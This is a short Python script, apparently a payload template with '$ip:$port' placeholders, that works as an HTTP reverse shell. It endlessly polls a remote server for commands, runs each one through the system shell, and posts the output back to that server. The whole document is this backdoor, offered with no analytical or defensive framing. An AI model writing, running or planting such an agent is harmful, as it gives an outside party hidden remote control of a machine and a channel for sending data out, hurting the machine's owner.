import urllib.request
import subprocess
import os
server_url = "http://$ip:$port/"
while True:
    try:
        req = urllib.request.Request(server_url)
        response = urllib.request.urlopen(req)
        cmd = response.read().decode().strip()
        if cmd.lower().startswith("cd "):
            path = cmd[3:].strip()
            os.chdir(path)
        output = subprocess.run(cmd,shell=True,capture_output=True,text=True)
        result = output.stdout + output.stderr
        data = urllib.request.urlopen(server_url,data=result.encode())
    except Exception as e:
        print(f"Error: {e}")